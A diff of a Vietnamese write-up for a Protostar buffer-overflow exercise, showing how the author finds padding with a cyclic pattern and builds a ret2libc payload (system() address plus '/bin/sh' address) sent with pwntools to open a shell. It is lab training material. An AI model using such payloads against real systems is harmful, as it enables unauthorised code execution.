@@ -48,7 +48,9 @@ int main(int argc, char **argv)
 Giải thích 1 chút, trên môi trường ubuntu của protostar thì ASLR off, và addr của stack luôn bắt đầu bằng `0xbf` cho nên bạn ko thể chèn shellcode. Vì nếu chèn shellcode khi EIP bắt đầu bằng `0xbf` thì lệnh if sẽ True và print() rồi _exit(). Vậy nên t sẽ return về địa chỉ của system() trong libc.
 
 *Tìm padding*
+
 ![screenshot](padding.png)
+
 `padding = cyclic(cyclic_find(uaaa))`
 *tìm địa chỉ system()*
 
@@ -81,7 +83,9 @@ system_addr = p32(0xb7ecffb0)
 ret="\x90"*4
 bin_sh_addr = p32(0xb7e97000+0x11f3bf)
 payload = padding + system_addr + ret + bin_sh_addr
-proc.sendline(payload)ru
+proc.recvuntil("please: ")
+proc.sendline(payload)
+proc.recvuntil('\n')
 proc.interactive()
 ```
 
